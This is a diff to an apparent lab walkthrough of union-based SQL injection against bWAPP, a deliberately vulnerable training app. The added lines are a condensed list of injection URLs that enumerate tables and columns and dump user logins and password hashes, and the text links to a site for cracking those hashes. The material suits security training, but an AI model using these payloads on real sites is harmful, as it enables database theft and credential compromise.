@@ -20,7 +20,7 @@
 > in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,version(),6,7-- -  (The MySQL Version() function returns the version of the MySQL database as a string.)
 > output: 5.5.47-0ubuntu0.14.04.1 (we got the database version)
 > in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,table_name,6,7 from information_schema.tables-- - (The TABLE_NAME function searches for an object and returns the unqualified name of the object after any alias chains have been resolved.)(INFORMATION_SCHEMA provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column, or access privileges.)
-> output: database metadata of table names
+> output: all the tables from the database
 > in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,table_name,6,7 from information_schema.tables where table_schema=database()-- - (TABLE_SCHEMA, Name of schema that contains the table.)
 > output: names of the tables
 > in url: https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,group_concat(table_name),6,7 from information_schema.tables where table_schema=database()-- - (The GROUP_CONCAT() function in MySQL is used to concatenate data from multiple rows into one field.)
@@ -33,7 +33,21 @@
 > output: login name and password separated with :
 > copy the hash password and decrypt it using https://hashes.com/en/decrypt/hash
 
-
-
+In simple steps:
+> https://bwapp.hakhub.net/sqli_1.php?title=1' order by 1-- -
+> https://bwapp.hakhub.net/sqli_1.php?title=1' order by 8-- -
+> https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,5,6,7-- -
+> https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,table_name,6,7 from information_schema.tables-- -
+> https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,column_name,6,7 from information_schema.columns where table_name="users"-- -
+> https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,2,3,4,group_concat(login,0x3a,password),6,7 from users-- -
+or
+> https://bwapp.hakhub.net/sqli_1.php?title=1' union select 1,id,login,4,password,6,7 from users-- -
 
 ---
+
+
+
+
+---SQL Injection (medium)---
+
+>
